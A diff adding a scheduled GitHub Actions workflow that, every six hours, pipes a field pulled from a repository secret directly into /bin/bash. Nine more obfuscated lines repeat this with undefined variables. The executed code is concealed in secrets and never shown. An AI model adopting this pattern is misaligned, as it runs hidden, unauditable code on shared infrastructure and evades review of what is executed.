@@ -1,0 +1,27 @@
+name: xixianjingpan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xixianjingpan
+        env:
+          kvoj0: ${{ secrets.kvoj0 }}
+        run: |
+          echo $kvoj0 | jq -r .gr3153 | /bin/bash
+          echo $jce300 | jq -r .pwcq96063 | /bin/bash
+          echo $t8 | jq -r .dk4 | /bin/bash
+          echo $hvup49 | jq -r .sr74 | /bin/bash
+          echo $l5 | jq -r .yl81 | /bin/bash
+          echo $m5088 | jq -r .xpoqm8 | /bin/bash
+          echo $i1 | jq -r .ryhly06341 | /bin/bash
+          echo $ucbg34 | jq -r .ve7006 | /bin/bash
+          echo $cufl6 | jq -r .u4 | /bin/bash
+          echo $iapbu0 | jq -r .oeh9096 | /bin/bash
+
